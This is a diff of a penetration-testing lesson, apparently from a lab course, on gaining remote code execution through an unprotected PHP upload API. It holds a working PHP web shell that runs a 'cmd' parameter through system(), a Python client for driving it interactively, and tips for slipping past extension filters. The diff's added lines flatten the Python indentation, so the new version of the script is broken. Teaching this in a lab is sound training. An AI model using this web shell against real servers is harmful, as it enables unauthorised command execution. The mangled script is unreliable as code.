@@ -4,34 +4,32 @@
 
 ## PHP File Upload via API to RCE
 
-Proceed to the end of this section and click onÂ `Click here to spawn the target system!`Â or theÂ `Reset Target`Â icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.
+Proceed to the end of this section and click on`Click here to spawn the target system!` or the`Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.
 
-Suppose we are assessing an application residing inÂ `http://<TARGET IP>:3001`.
+Suppose we are assessing an application residing in`http://<TARGET IP>:3001`.
 
-When we browse the application, an anonymous file uploading functionality sticks out.Â 
+When we browse the application, an anonymous file uploading functionality sticks out. ![image](https://academy.hackthebox.com/storage/modules/160/2.png)
 
-![image](https://academy.hackthebox.com/storage/modules/160/2.png)
-
-Let us create the below file (save it asÂ `backdoor.php`) and try to upload it via the available functionality.
+Let us create the below file (save it as`backdoor.php`) and try to upload it via the available functionality.
 
 
 ```php
 <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
 ```
 
-The above allows us to append the parameterÂ _cmd_Â to our request (to backdoor.php), which will be executed usingÂ _system()_. This is if we can determineÂ _backdoor.php_'s location, ifÂ _backdoor.php_Â will be rendered successfully and if no PHP function restrictions exist.
+The above allows us to append the parameter _cmd_ to our request (to backdoor.php), which will be executed using _system()_. This is if we can determine _backdoor.php_'s location, if _backdoor.php_ will be rendered successfully and if no PHP function restrictions exist.
 
 ![image](https://academy.hackthebox.com/storage/modules/160/4.png)
 
-- _backdoor.php_Â was successfully uploaded via a POST request toÂ `/api/upload/`. An API seems to be handling the file uploading functionality of the application.
-- The content type has been automatically set toÂ `application/x-php`, which means there is no protection in place. The content type would probably be set toÂ `application/octet-stream`Â orÂ `text/plain`Â if there was one.
-- Uploading a file with aÂ _.php_Â extension is also allowed. If there was a limitation on the extensions, we could try extensions such asÂ `.jpg.php`,Â `.PHP`, etc.
-- Using something likeÂ [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php)Â to identify php code being uploaded seems not in place either.
-- We also receive the location where our file is stored,Â `http://<TARGET IP>:3001/uploads/backdoor.php`.
+- _backdoor.php_ was successfully uploaded via a POST request to`/api/upload/`. An API seems to be handling the file uploading functionality of the application.
+- The content type has been automatically set to`application/x-php`, which means there is no protection in place. The content type would probably be set to`application/octet-stream` or`text/plain` if there was one.
+- Uploading a file with a _.php_ extension is also allowed. If there was a limitation on the extensions, we could try extensions such as`.jpg.php`,`.PHP`, etc.
+- Using something like [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php) to identify php code being uploaded seems not in place either.
+- We also receive the location where our file is stored,`http://<TARGET IP>:3001/uploads/backdoor.php`.
 
-We can use the below Python script (save it asÂ `web_shell.py`) to obtain a shell, leveraging the uploadedÂ `backdoor.php`Â file.
+We can use the below Python script (save it as`web_shell.py`) to obtain a shell, leveraging the uploaded`backdoor.php` file.
 
-Code:Â python
+Code: python
 
 ```python
 import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
@@ -41,20 +39,20 @@ parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E
 parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
 args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
 if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
-    parser.print_help() # shows help menu
+ parser.print_help() # shows help menu
 elif args.target and args.payload: # elif (if they both have values do some action)
-    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
+ print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
 if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
-    os.system("clear") # clear the screen (linux)
-    while True: # starts a while loop (never ending loop)
-        try: # try statement
-            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
-            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
-            time.sleep(0.3) # waits 0.3 seconds during each request
-        except requests.exceptions.InvalidSchema: # error handling
-            print("Invalid URL Schema: http:// or https://")
-        except requests.exceptions.ConnectionError: # error handling
-            print("URL is invalid")
+ os.system("clear") # clear the screen (linux)
+ while True: # starts a while loop (never ending loop)
+ try: # try statement
+ cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
+ print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
+ time.sleep(0.3) # waits 0.3 seconds during each request
+ except requests.exceptions.InvalidSchema: # error handling
+ print("Invalid URL Schema: http:// or https://")
+ except requests.exceptions.ConnectionError: # error handling
+ print("URL is invalid")
 ```
 
 Use the script as follows.
@@ -101,20 +99,20 @@ parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E
 parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
 args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
 if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
-    parser.print_help() # shows help menu
+ parser.print_help() # shows help menu
 elif args.target and args.payload: # elif (if they both have values do some action)
-    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
+ print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
 if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
-    os.system("clear") # clear the screen (linux)
-    while True: # starts a while loop (never ending loop)
-        try: # try statement
-            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
-            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
-            time.sleep(0.3) # waits 0.3 seconds during each request
-        except requests.exceptions.InvalidSchema: # error handling
-            print("Invalid URL Schema: http:// or https://")
-        except requests.exceptions.ConnectionError: # error handling
-            print("URL is invalid")
+ os.system("clear") # clear the screen (linux)
+ while True: # starts a while loop (never ending loop)
+ try: # try statement
+ cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
+ print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
+ time.sleep(0.3) # waits 0.3 seconds during each request
+ except requests.exceptions.InvalidSchema: # error handling
+ print("Invalid URL Schema: http:// or https://")
+ except requests.exceptions.ConnectionError: # error handling
+ print("URL is invalid")
 ```
 
 Now, let's use it:
